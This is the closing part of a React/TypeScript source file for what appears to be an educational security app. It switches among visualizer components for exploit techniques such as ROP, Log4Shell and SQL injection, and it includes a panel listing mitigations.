                        {exploitType === ExploitType.FORMAT_STRING && <FormatStringVisualizer step={currentStep} />}
                        {exploitType === ExploitType.INTEGER_OVERFLOW && <IntegerOverflowVisualizer step={currentStep} />}
                        {exploitType === ExploitType.DOUBLE_FREE && <DoubleFreeVisualizer step={currentStep} />}
                        {exploitType === ExploitType.ROP && <ROPVisualizer step={currentStep} />}
                        {exploitType === ExploitType.HEAVENS_GATE && <HeavensGateVisualizer step={currentStep} />}
                        {exploitType === ExploitType.REFLECTIVE_DLL && <ReflectiveDllVisualizer step={currentStep} />}
                        {exploitType === ExploitType.PROCESS_HOLLOWING && <ProcessHollowingVisualizer step={currentStep} />}
                        {exploitType === ExploitType.THREAD_HIJACKING && <ThreadHijackingVisualizer step={currentStep} />}
                        {exploitType === ExploitType.NETWORK_MAPPING && <NetworkMappingVisualizer step={currentStep} />}
                        {exploitType === ExploitType.WAF && <WafVisualizer step={currentStep} />}
                        {exploitType === ExploitType.IPS && <IpsVisualizer step={currentStep} />}
                        {exploitType === ExploitType.CFW && <ControlFlowFlatteningVisualizer step={currentStep} />}
                        {exploitType === ExploitType.SQLI && <SqlInjectionVisualizer step={currentStep} />}
                        {exploitType === ExploitType.SSRF && <SsrfVisualizer step={currentStep} />}
                        {exploitType === ExploitType.CSRF && <CsrfVisualizer step={currentStep} />}
                        {exploitType === ExploitType.LOG4SHELL && <Log4ShellVisualizer step={currentStep} />}
                        {exploitType === ExploitType.NEXTJS_RCE && <NextJsRceVisualizer step={currentStep} />}
                        {exploitType === ExploitType.XXE && <XxeVisualizer step={currentStep} />}
                        {exploitType === ExploitType.XSS && <XssVisualizer step={currentStep} />}
                        {exploitType === ExploitType.FILE_UPLOAD && <FileUploadVisualizer step={currentStep} />}
                        {exploitType === ExploitType.PATH_TRAVERSAL && <PathTraversalVisualizer step={currentStep} />}
                        {exploitType === ExploitType.DESERIALIZATION && <DeserializationVisualizer step={currentStep} />}
                        {exploitType === ExploitType.FASTJSON && <FastjsonVisualizer step={currentStep} />}
                        {exploitType === ExploitType.AES && <AesVisualizer step={currentStep} />}
                        {category !== Category.WEB && !([ExploitType.NETWORK_MAPPING, ExploitType.WAF, ExploitType.IPS, ExploitType.CFW].includes(exploitType)) && (<AssemblyViewer type={exploitType} arch={architecture} stepId={safeStepIndex} />)}
                    </div>
                </div>
                {isROP && (
                    <div className="lg:col-span-3 flex flex-col h-full min-h-[500px]">
                            <ROPFlowChart />
                            <div className="bg-green-900/10 border border-green-800/50 rounded-xl p-4 mt-4 flex-1">
                                <div className="flex items-center gap-2 text-green-400 text-sm font-bold mb-3 uppercase tracking-wider"><ShieldCheck size={16} /> {t.mitigation}</div>
                                <ul className="text-xs text-slate-300 space-y-2 list-disc list-inside">{((MITIGATIONS as any)[exploitType]?.[language] || []).map((m: string, i: number) => (<li key={i}>{m}</li>))}</ul>
                            </div>
                    </div>
                )}
            </div>
            )}
         </div>
      </main>
    </div>
  );
};

export default App;
